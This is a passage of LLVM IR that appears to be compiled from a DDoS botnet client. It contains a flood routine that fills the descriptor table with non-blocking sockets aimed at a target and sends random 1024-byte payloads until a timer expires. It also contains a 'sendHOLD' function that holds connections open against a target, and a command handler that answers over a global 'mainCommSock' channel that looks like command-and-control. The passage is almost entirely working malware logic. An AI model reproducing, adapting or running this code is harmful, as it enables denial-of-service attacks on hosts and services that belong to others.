  %37 = call i8* @llvm.stacksave()
  store i8* %37, i8** %10, align 8
  %38 = alloca %struct.state_t, i64 %36, align 16
  %39 = bitcast %struct.state_t* %38 to i8*
  %40 = load i32, i32* %7, align 4
  %41 = sext i32 %40 to i64
  %42 = mul i64 %41, 5
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 %42, i32 16, i1 false)
  %43 = call noalias i8* @malloc(i64 1024) #4
  store i8* %43, i8** %16, align 8
  %44 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 1024, i32 1, i1 false)
  %45 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %46 = load i32, i32* %6, align 4
  %47 = add nsw i32 %45, %46
  store i32 %47, i32* %17, align 4
  br label %48

; <label>:48:                                     ; preds = %223, %32
  %49 = load i32, i32* %17, align 4
  %50 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %51 = icmp sgt i32 %49, %50
  br i1 %51, label %52, label %224

; <label>:52:                                     ; preds = %48
  store i32 0, i32* %8, align 4
  br label %53

; <label>:53:                                     ; preds = %220, %52
  %54 = load i32, i32* %8, align 4
  %55 = load i32, i32* %7, align 4
  %56 = icmp slt i32 %54, %55
  br i1 %56, label %57, label %223

; <label>:57:                                     ; preds = %53
  %58 = load i32, i32* %8, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %59
  %61 = getelementptr inbounds %struct.state_t, %struct.state_t* %60, i32 0, i32 1
  %62 = load i8, i8* %61, align 4
  %63 = zext i8 %62 to i32
  switch i32 %63, label %219 [
    i32 0, label %64
    i32 1, label %108
    i32 2, label %193
  ]

; <label>:64:                                     ; preds = %57
  %65 = call i32 @socket(i32 2, i32 1, i32 0) #4
  %66 = load i32, i32* %8, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %67
  %69 = getelementptr inbounds %struct.state_t, %struct.state_t* %68, i32 0, i32 0
  store i32 %65, i32* %69, align 8
  %70 = load i32, i32* %8, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %71
  %73 = getelementptr inbounds %struct.state_t, %struct.state_t* %72, i32 0, i32 0
  %74 = load i32, i32* %73, align 8
  %75 = load i32, i32* %8, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %76
  %78 = getelementptr inbounds %struct.state_t, %struct.state_t* %77, i32 0, i32 0
  %79 = load i32, i32* %78, align 8
  %80 = call i32 (i32, i32, ...) @fcntl(i32 %79, i32 3, i8* null)
  %81 = or i32 %80, 2048
  %82 = call i32 (i32, i32, ...) @fcntl(i32 %74, i32 4, i32 %81)
  %83 = load i32, i32* %8, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %84
  %86 = getelementptr inbounds %struct.state_t, %struct.state_t* %85, i32 0, i32 0
  %87 = load i32, i32* %86, align 8
  %88 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %89 = call i32 @connect(i32 %87, %struct.sockaddr* %88, i32 16)
  %90 = icmp ne i32 %89, -1
  br i1 %90, label %95, label %91

; <label>:91:                                     ; preds = %64
  %92 = call i32* @__errno_location() #13
  %93 = load i32, i32* %92, align 4
  %94 = icmp ne i32 %93, 115
  br i1 %94, label %95, label %102

; <label>:95:                                     ; preds = %91, %64
  %96 = load i32, i32* %8, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %97
  %99 = getelementptr inbounds %struct.state_t, %struct.state_t* %98, i32 0, i32 0
  %100 = load i32, i32* %99, align 8
  %101 = call i32 @close(i32 %100)
  br label %107

; <label>:102:                                    ; preds = %91
  %103 = load i32, i32* %8, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %104
  %106 = getelementptr inbounds %struct.state_t, %struct.state_t* %105, i32 0, i32 1
  store i8 1, i8* %106, align 4
  br label %107

; <label>:107:                                    ; preds = %102, %95
  br label %219

; <label>:108:                                    ; preds = %57
  br label %109

; <label>:109:                                    ; preds = %108
  %110 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %111 = getelementptr inbounds [16 x i64], [16 x i64]* %110, i64 0, i64 0
  %112 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %111) #4, !srcloc !6
  %113 = extractvalue { i64, i64* } %112, 0
  %114 = extractvalue { i64, i64* } %112, 1
  %115 = trunc i64 %113 to i32
  store i32 %115, i32* %18, align 4
  %116 = ptrtoint i64* %114 to i64
  %117 = trunc i64 %116 to i32
  store i32 %117, i32* %19, align 4
  br label %118

; <label>:118:                                    ; preds = %109
  br label %119

; <label>:119:                                    ; preds = %118
  %120 = load i32, i32* %8, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %121
  %123 = getelementptr inbounds %struct.state_t, %struct.state_t* %122, i32 0, i32 0
  %124 = load i32, i32* %123, align 8
  %125 = srem i32 %124, 64
  %126 = zext i32 %125 to i64
  %127 = shl i64 1, %126
  %128 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %129 = load i32, i32* %8, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %130
  %132 = getelementptr inbounds %struct.state_t, %struct.state_t* %131, i32 0, i32 0
  %133 = load i32, i32* %132, align 8
  %134 = sdiv i32 %133, 64
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds [16 x i64], [16 x i64]* %128, i64 0, i64 %135
  %137 = load i64, i64* %136, align 8
  %138 = or i64 %137, %127
  store i64 %138, i64* %136, align 8
  %139 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %139, align 8
  %140 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %140, align 8
  %141 = load i32, i32* %8, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %142
  %144 = getelementptr inbounds %struct.state_t, %struct.state_t* %143, i32 0, i32 0
  %145 = load i32, i32* %144, align 8
  %146 = add nsw i32 %145, 1
  %147 = call i32 @select(i32 %146, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %147, i32* %15, align 4
  %148 = load i32, i32* %15, align 4
  %149 = icmp eq i32 %148, 1
  br i1 %149, label %150, label %177

; <label>:150:                                    ; preds = %119
  store i32 4, i32* %13, align 4
  %151 = load i32, i32* %8, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %152
  %154 = getelementptr inbounds %struct.state_t, %struct.state_t* %153, i32 0, i32 0
  %155 = load i32, i32* %154, align 8
  %156 = bitcast i32* %14 to i8*
  %157 = call i32 @getsockopt(i32 %155, i32 1, i32 4, i8* %156, i32* %13) #4
  %158 = load i32, i32* %14, align 4
  %159 = icmp ne i32 %158, 0
  br i1 %159, label %160, label %171

; <label>:160:                                    ; preds = %150
  %161 = load i32, i32* %8, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %162
  %164 = getelementptr inbounds %struct.state_t, %struct.state_t* %163, i32 0, i32 0
  %165 = load i32, i32* %164, align 8
  %166 = call i32 @close(i32 %165)
  %167 = load i32, i32* %8, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %168
  %170 = getelementptr inbounds %struct.state_t, %struct.state_t* %169, i32 0, i32 1
  store i8 0, i8* %170, align 4
  br label %176

; <label>:171:                                    ; preds = %150
  %172 = load i32, i32* %8, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %173
  %175 = getelementptr inbounds %struct.state_t, %struct.state_t* %174, i32 0, i32 1
  store i8 2, i8* %175, align 4
  br label %176

; <label>:176:                                    ; preds = %171, %160
  br label %192

; <label>:177:                                    ; preds = %119
  %178 = load i32, i32* %15, align 4
  %179 = icmp eq i32 %178, -1
  br i1 %179, label %180, label %191

; <label>:180:                                    ; preds = %177
  %181 = load i32, i32* %8, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %182
  %184 = getelementptr inbounds %struct.state_t, %struct.state_t* %183, i32 0, i32 0
  %185 = load i32, i32* %184, align 8
  %186 = call i32 @close(i32 %185)
  %187 = load i32, i32* %8, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %188
  %190 = getelementptr inbounds %struct.state_t, %struct.state_t* %189, i32 0, i32 1
  store i8 0, i8* %190, align 4
  br label %191

; <label>:191:                                    ; preds = %180, %177
  br label %192

; <label>:192:                                    ; preds = %191, %176
  br label %219

; <label>:193:                                    ; preds = %57
  %194 = load i8*, i8** %16, align 8
  call void @makeRandomStr(i8* %194, i32 1024)
  %195 = load i32, i32* %8, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %196
  %198 = getelementptr inbounds %struct.state_t, %struct.state_t* %197, i32 0, i32 0
  %199 = load i32, i32* %198, align 8
  %200 = load i8*, i8** %16, align 8
  %201 = call i64 @send(i32 %199, i8* %200, i64 1024, i32 16384)
  %202 = icmp eq i64 %201, -1
  br i1 %202, label %203, label %218

; <label>:203:                                    ; preds = %193
  %204 = call i32* @__errno_location() #13
  %205 = load i32, i32* %204, align 4
  %206 = icmp ne i32 %205, 11
  br i1 %206, label %207, label %218

; <label>:207:                                    ; preds = %203
  %208 = load i32, i32* %8, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %209
  %211 = getelementptr inbounds %struct.state_t, %struct.state_t* %210, i32 0, i32 0
  %212 = load i32, i32* %211, align 8
  %213 = call i32 @close(i32 %212)
  %214 = load i32, i32* %8, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %215
  %217 = getelementptr inbounds %struct.state_t, %struct.state_t* %216, i32 0, i32 1
  store i8 0, i8* %217, align 4
  br label %218

; <label>:218:                                    ; preds = %207, %203, %193
  br label %219

; <label>:219:                                    ; preds = %218, %192, %107, %57
  br label %220

; <label>:220:                                    ; preds = %219
  %221 = load i32, i32* %8, align 4
  %222 = add nsw i32 %221, 1
  store i32 %222, i32* %8, align 4
  br label %53

; <label>:223:                                    ; preds = %53
  br label %48

; <label>:224:                                    ; preds = %48
  %225 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %225)
  br label %226

; <label>:226:                                    ; preds = %224, %31
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #4
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %3
  br label %256

; <label>:34:                                     ; preds = %3
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %36 = getelementptr inbounds [8 x i8], [8 x i8]* %35, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 8, i32 4, i1 false)
  %37 = load i32, i32* %7, align 4
  %38 = zext i32 %37 to i64
  %39 = call i8* @llvm.stacksave()
  store i8* %39, i8** %10, align 8
  %40 = alloca %struct.state_t, i64 %38, align 16
  %41 = bitcast %struct.state_t* %40 to i8*
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = mul i64 %43, 5
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 %44, i32 16, i1 false)
  %45 = call noalias i8* @malloc(i64 1024) #4
  store i8* %45, i8** %16, align 8
  %46 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 1024, i32 1, i1 false)
  %47 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %48 = load i32, i32* %6, align 4
  %49 = add nsw i32 %47, %48
  store i32 %49, i32* %17, align 4
  br label %50

; <label>:50:                                     ; preds = %253, %34
  %51 = load i32, i32* %17, align 4
  %52 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %53 = icmp sgt i32 %51, %52
  br i1 %53, label %54, label %254

; <label>:54:                                     ; preds = %50
  store i32 0, i32* %8, align 4
  br label %55

; <label>:55:                                     ; preds = %250, %54
  %56 = load i32, i32* %8, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp slt i32 %56, %57
  br i1 %58, label %59, label %253

; <label>:59:                                     ; preds = %55
  %60 = load i32, i32* %8, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %61
  %63 = getelementptr inbounds %struct.state_t, %struct.state_t* %62, i32 0, i32 1
  %64 = load i8, i8* %63, align 4
  %65 = zext i8 %64 to i32
  switch i32 %65, label %249 [
    i32 0, label %66
    i32 1, label %110
    i32 2, label %195
  ]

; <label>:66:                                     ; preds = %59
  %67 = call i32 @socket(i32 2, i32 1, i32 0) #4
  %68 = load i32, i32* %8, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %69
  %71 = getelementptr inbounds %struct.state_t, %struct.state_t* %70, i32 0, i32 0
  store i32 %67, i32* %71, align 8
  %72 = load i32, i32* %8, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %73
  %75 = getelementptr inbounds %struct.state_t, %struct.state_t* %74, i32 0, i32 0
  %76 = load i32, i32* %75, align 8
  %77 = load i32, i32* %8, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %78
  %80 = getelementptr inbounds %struct.state_t, %struct.state_t* %79, i32 0, i32 0
  %81 = load i32, i32* %80, align 8
  %82 = call i32 (i32, i32, ...) @fcntl(i32 %81, i32 3, i8* null)
  %83 = or i32 %82, 2048
  %84 = call i32 (i32, i32, ...) @fcntl(i32 %76, i32 4, i32 %83)
  %85 = load i32, i32* %8, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %86
  %88 = getelementptr inbounds %struct.state_t, %struct.state_t* %87, i32 0, i32 0
  %89 = load i32, i32* %88, align 8
  %90 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %91 = call i32 @connect(i32 %89, %struct.sockaddr* %90, i32 16)
  %92 = icmp ne i32 %91, -1
  br i1 %92, label %97, label %93

; <label>:93:                                     ; preds = %66
  %94 = call i32* @__errno_location() #13
  %95 = load i32, i32* %94, align 4
  %96 = icmp ne i32 %95, 115
  br i1 %96, label %97, label %104

; <label>:97:                                     ; preds = %93, %66
  %98 = load i32, i32* %8, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %99
  %101 = getelementptr inbounds %struct.state_t, %struct.state_t* %100, i32 0, i32 0
  %102 = load i32, i32* %101, align 8
  %103 = call i32 @close(i32 %102)
  br label %109

; <label>:104:                                    ; preds = %93
  %105 = load i32, i32* %8, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %106
  %108 = getelementptr inbounds %struct.state_t, %struct.state_t* %107, i32 0, i32 1
  store i8 1, i8* %108, align 4
  br label %109

; <label>:109:                                    ; preds = %104, %97
  br label %249

; <label>:110:                                    ; preds = %59
  br label %111

; <label>:111:                                    ; preds = %110
  %112 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %113 = getelementptr inbounds [16 x i64], [16 x i64]* %112, i64 0, i64 0
  %114 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %113) #4, !srcloc !7
  %115 = extractvalue { i64, i64* } %114, 0
  %116 = extractvalue { i64, i64* } %114, 1
  %117 = trunc i64 %115 to i32
  store i32 %117, i32* %18, align 4
  %118 = ptrtoint i64* %116 to i64
  %119 = trunc i64 %118 to i32
  store i32 %119, i32* %19, align 4
  br label %120

; <label>:120:                                    ; preds = %111
  br label %121

; <label>:121:                                    ; preds = %120
  %122 = load i32, i32* %8, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %123
  %125 = getelementptr inbounds %struct.state_t, %struct.state_t* %124, i32 0, i32 0
  %126 = load i32, i32* %125, align 8
  %127 = srem i32 %126, 64
  %128 = zext i32 %127 to i64
  %129 = shl i64 1, %128
  %130 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %131 = load i32, i32* %8, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %132
  %134 = getelementptr inbounds %struct.state_t, %struct.state_t* %133, i32 0, i32 0
  %135 = load i32, i32* %134, align 8
  %136 = sdiv i32 %135, 64
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds [16 x i64], [16 x i64]* %130, i64 0, i64 %137
  %139 = load i64, i64* %138, align 8
  %140 = or i64 %139, %129
  store i64 %140, i64* %138, align 8
  %141 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %141, align 8
  %142 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %142, align 8
  %143 = load i32, i32* %8, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %144
  %146 = getelementptr inbounds %struct.state_t, %struct.state_t* %145, i32 0, i32 0
  %147 = load i32, i32* %146, align 8
  %148 = add nsw i32 %147, 1
  %149 = call i32 @select(i32 %148, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %149, i32* %15, align 4
  %150 = load i32, i32* %15, align 4
  %151 = icmp eq i32 %150, 1
  br i1 %151, label %152, label %179

; <label>:152:                                    ; preds = %121
  store i32 4, i32* %13, align 4
  %153 = load i32, i32* %8, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %154
  %156 = getelementptr inbounds %struct.state_t, %struct.state_t* %155, i32 0, i32 0
  %157 = load i32, i32* %156, align 8
  %158 = bitcast i32* %14 to i8*
  %159 = call i32 @getsockopt(i32 %157, i32 1, i32 4, i8* %158, i32* %13) #4
  %160 = load i32, i32* %14, align 4
  %161 = icmp ne i32 %160, 0
  br i1 %161, label %162, label %173

; <label>:162:                                    ; preds = %152
  %163 = load i32, i32* %8, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %164
  %166 = getelementptr inbounds %struct.state_t, %struct.state_t* %165, i32 0, i32 0
  %167 = load i32, i32* %166, align 8
  %168 = call i32 @close(i32 %167)
  %169 = load i32, i32* %8, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %170
  %172 = getelementptr inbounds %struct.state_t, %struct.state_t* %171, i32 0, i32 1
  store i8 0, i8* %172, align 4
  br label %178

; <label>:173:                                    ; preds = %152
  %174 = load i32, i32* %8, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %175
  %177 = getelementptr inbounds %struct.state_t, %struct.state_t* %176, i32 0, i32 1
  store i8 2, i8* %177, align 4
  br label %178

; <label>:178:                                    ; preds = %173, %162
  br label %194

; <label>:179:                                    ; preds = %121
  %180 = load i32, i32* %15, align 4
  %181 = icmp eq i32 %180, -1
  br i1 %181, label %182, label %193

; <label>:182:                                    ; preds = %179
  %183 = load i32, i32* %8, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %184
  %186 = getelementptr inbounds %struct.state_t, %struct.state_t* %185, i32 0, i32 0
  %187 = load i32, i32* %186, align 8
  %188 = call i32 @close(i32 %187)
  %189 = load i32, i32* %8, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %190
  %192 = getelementptr inbounds %struct.state_t, %struct.state_t* %191, i32 0, i32 1
  store i8 0, i8* %192, align 4
  br label %193

; <label>:193:                                    ; preds = %182, %179
  br label %194

; <label>:194:                                    ; preds = %193, %178
  br label %249

; <label>:195:                                    ; preds = %59
  br label %196

; <label>:196:                                    ; preds = %195
  %197 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %198 = getelementptr inbounds [16 x i64], [16 x i64]* %197, i64 0, i64 0
  %199 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %198) #4, !srcloc !8
  %200 = extractvalue { i64, i64* } %199, 0
  %201 = extractvalue { i64, i64* } %199, 1
  %202 = trunc i64 %200 to i32
  store i32 %202, i32* %20, align 4
  %203 = ptrtoint i64* %201 to i64
  %204 = trunc i64 %203 to i32
  store i32 %204, i32* %21, align 4
  br label %205

; <label>:205:                                    ; preds = %196
  br label %206

; <label>:206:                                    ; preds = %205
  %207 = load i32, i32* %8, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %208
  %210 = getelementptr inbounds %struct.state_t, %struct.state_t* %209, i32 0, i32 0
  %211 = load i32, i32* %210, align 8
  %212 = srem i32 %211, 64
  %213 = zext i32 %212 to i64
  %214 = shl i64 1, %213
  %215 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %216 = load i32, i32* %8, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %217
  %219 = getelementptr inbounds %struct.state_t, %struct.state_t* %218, i32 0, i32 0
  %220 = load i32, i32* %219, align 8
  %221 = sdiv i32 %220, 64
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds [16 x i64], [16 x i64]* %215, i64 0, i64 %222
  %224 = load i64, i64* %223, align 8
  %225 = or i64 %224, %214
  store i64 %225, i64* %223, align 8
  %226 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %226, align 8
  %227 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %227, align 8
  %228 = load i32, i32* %8, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %229
  %231 = getelementptr inbounds %struct.state_t, %struct.state_t* %230, i32 0, i32 0
  %232 = load i32, i32* %231, align 8
  %233 = add nsw i32 %232, 1
  %234 = call i32 @select(i32 %233, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.timeval* %12)
  store i32 %234, i32* %15, align 4
  %235 = load i32, i32* %15, align 4
  %236 = icmp ne i32 %235, 0
  br i1 %236, label %237, label %248

; <label>:237:                                    ; preds = %206
  %238 = load i32, i32* %8, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %239
  %241 = getelementptr inbounds %struct.state_t, %struct.state_t* %240, i32 0, i32 0
  %242 = load i32, i32* %241, align 8
  %243 = call i32 @close(i32 %242)
  %244 = load i32, i32* %8, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %245
  %247 = getelementptr inbounds %struct.state_t, %struct.state_t* %246, i32 0, i32 1
  store i8 0, i8* %247, align 4
  br label %248

; <label>:248:                                    ; preds = %237, %206
  br label %249

; <label>:249:                                    ; preds = %248, %194, %109, %59
  br label %250

; <label>:250:                                    ; preds = %249
  %251 = load i32, i32* %8, align 4
  %252 = add nsw i32 %251, 1
  store i32 %252, i32* %8, align 4
  br label %55

; <label>:253:                                    ; preds = %55
  br label %50

; <label>:254:                                    ; preds = %50
  %255 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %255)
  br label %256

; <label>:256:                                    ; preds = %254, %33
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %34 = load i8**, i8*** %4, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 0
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 @strcmp(i8* %36, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0)) #10
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %42, label %39

; <label>:39:                                     ; preds = %2
  %40 = load i32, i32* @mainCommSock, align 4
  %41 = call i32 (i32, i8*, ...) @sockprintf(i32 %40, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.50, i32 0, i32 0))
  br label %640

; <label>:42:                                     ; preds = %2
  %43 = load i8**, i8*** %4, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 0
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @strcmp(i8* %45, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.51, i32 0, i32 0)) #10
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %53, label %48

; <label>:48:                                     ; preds = %42
  %49 = load i32, i32* @mainCommSock, align 4
  %50 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %51 = call i8* @inet_ntoa(i32 %50) #4
  %52 = call i32 (i32, i8*, ...) @sockprintf(i32 %49, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.52, i32 0, i32 0), i8* %51)
  br label %640

; <label>:53:                                     ; preds = %42
  %54 = load i8**, i8*** %4, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 0
  %56 = load i8*, i8** %55, align 8
  %57 = call i32 @strcmp(i8* %56, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.53, i32 0, i32 0)) #10
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %101, label %59

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* %3, align 4
  %61 = icmp ne i32 %60, 2
  br i1 %61, label %62, label %65

; <label>:62:                                     ; preds = %59
  %63 = load i32, i32* @mainCommSock, align 4
